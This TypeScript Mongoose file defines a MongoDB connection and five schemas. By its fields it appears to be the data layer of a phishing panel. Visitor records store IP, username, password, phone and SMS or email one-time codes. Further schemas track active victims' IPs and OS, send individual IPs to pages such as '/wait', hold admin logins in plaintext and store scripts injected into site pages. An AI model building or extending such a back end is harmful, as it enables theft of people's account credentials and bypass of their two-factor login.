import mongoose, { Schema } from 'mongoose';
import crypto from 'crypto';

/**
 * Proje için sabit bir veritabanı adı oluşturur
 * Bu fonksiyon, proje kimliğine bağlı olarak sabit bir veritabanı adı oluşturur
 * Böylece her deploy veya yeniden başlatmada aynı veritabanı kullanılır
 */
function generateStableDbName(): string {
  // Proje kimliği için önce PROJECT_ID'yi kontrol edelim, yoksa VERCEL_URL veya varsayılan kullanılır
  const projectIdentifier = process.env.PROJECT_ID || process.env.VERCEL_URL || 'local-project';
  
  // Veritabanı adı olarak proje kimliğinden bir hash oluştur
  // Bu, proje kimliği değişmediği sürece aynı veritabanı adının kullanılmasını sağlar
  const dbName = crypto
    .createHash('md5')
    .update(projectIdentifier)
    .digest('hex')
    .substring(0, 10);
  
  return dbName;
}

/**
 * MongoDB URI'yi proje için sabit bir veritabanı adıyla günceller
 */
function getMongoUriWithStableDb(baseUri: string): string {
  // URI'yi ayrıştır
  const lastSlash = baseUri.lastIndexOf('/');
  
  // Eğer URI'de / yoksa, sonuna sabit veritabanı adı ekle
  if (lastSlash === -1) {
    return `${baseUri}/${generateStableDbName()}`;
  }
  
  // Eğer URI'de / varsa, sonuncu / sonrasını değiştir
  const baseUriWithoutDb = baseUri.substring(0, lastSlash);
  return `${baseUriWithoutDb}/${generateStableDbName()}`;
}

// MongoDB bağlantı bilgilerini al
let MONGO_URI = process.env.MONGO_URI;

// Eğer USE_PROJECT_DB true ise, proje için sabit veritabanı adı kullan
// Artık rastgele değil, proje kimliğine bağlı sabit bir ad kullanılıyor
if (process.env.USE_PROJECT_DB === 'true' && MONGO_URI) {
  MONGO_URI = getMongoUriWithStableDb(MONGO_URI);
  console.log('MongoDB proje veritabanı bağlantısı:', MONGO_URI.replace(/\/\/[^:]+:[^@]+@/, '//****:****@')); // Güvenlik için kullanıcı adı ve şifreyi gizle
}

// Mongoose bağlantısı
const connectMongoDB = async () => {
  if (!MONGO_URI) {
    throw new Error('MongoDB URI bulunamadı');
  }
  
  try {
    if (mongoose.connection.readyState === 0) {
      await mongoose.connect(MONGO_URI);
      console.log('MongoDB bağlantısı başarılı');
      
      // Bağlantı başarılı olduktan sonra veritabanı bilgilerini logla
      if (mongoose.connection.db) {
        console.log('Veritabanı adı:', mongoose.connection.db.databaseName);
      }
      console.log('Bağlantı durumu:', mongoose.connection.readyState);
    }
  } catch (error) {
    console.error('MongoDB bağlantı hatası:', error);
  }
};

// Record Şeması
const recordSchema = new Schema({
  ipAddress: { type: String, required: true },
  username: { type: String, default: '' },
  password: { type: String, default: '' },
  phone: { type: String, default: '' },
  phone_sms: { type: String, default: '' },
  mail_sms: { type: String, default: '' },
  hotmail: { type: String, default: '' },
  auth: { type: String, default: '' },
  createdAt: { type: Date, default: Date.now }
}, {
  collection: 'records',
  timestamps: true
});

// Admin Şeması
const adminSchema = new Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  isActive: { type: Boolean, default: true }
}, {
  collection: 'admins',
  timestamps: true
});

// Active IP Şeması
const activeSchema = new Schema({
  ipAddress: { type: String, required: true },
  lastSeen: { type: Date, default: Date.now },
  isActive: { type: Boolean, default: true },
  os: { type: String, default: 'Bilinmiyor' }
}, {
  collection: 'active_ips',
  timestamps: true
});

// Redirect Şeması
const redirectSchema = new Schema({
  ipAddress: { type: String, required: true },
  page: { type: String, default: '/wait' },
  createdAt: { type: Date, default: Date.now }
}, {
  collection: 'redirects',
  timestamps: true
});

// Script Şeması
const scriptSchema = new Schema({
  name: { type: String, required: true },
  content: { type: String, required: true },
  placement: { type: String, enum: ['head', 'body'], default: 'head' },
  isActive: { type: Boolean, default: true },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
}, {
  collection: 'scripts',
  timestamps: true
});

// Modelleri tanımlama
export const Record = mongoose.models.Record || mongoose.model('Record', recordSchema);
export const Admin = mongoose.models.Admin || mongoose.model('Admin', adminSchema);
export const Active = mongoose.models.Active || mongoose.model('Active', activeSchema);
export const Redirect = mongoose.models.Redirect || mongoose.model('Redirect', redirectSchema);
export const Script = mongoose.models.Script || mongoose.model('Script', scriptSchema);

export { connectMongoDB }; 